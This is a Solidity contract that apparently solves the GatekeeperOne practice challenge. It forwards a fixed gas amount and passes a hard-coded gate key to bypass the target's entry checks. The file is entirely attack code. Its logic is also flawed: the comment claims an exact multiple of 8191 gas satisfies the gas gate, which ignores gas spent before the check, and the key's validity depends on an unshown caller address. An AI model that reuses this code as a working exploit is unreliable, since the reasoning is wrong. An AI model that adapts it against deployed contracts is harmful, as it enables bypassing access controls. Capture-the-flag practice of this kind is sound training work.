// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}


contract FinalGasAttack {
    GatekeeperOne public target;

    constructor(address _target) {
        target = GatekeeperOne(_target);
    }

    function attack(bytes8 _key) public {
        // Call enter with gas that is a multiple of 8191 to satisfy modifier
        (bool success, ) = payable(address(target)).call{gas: 24573}(abi.encodeWithSignature("enter(bytes8)", _key));
    }

    function generateKey() public view returns (bytes8) {
        // Final key meets all gateThree conditions
        return bytes8(0x1234567800002266);
    }
}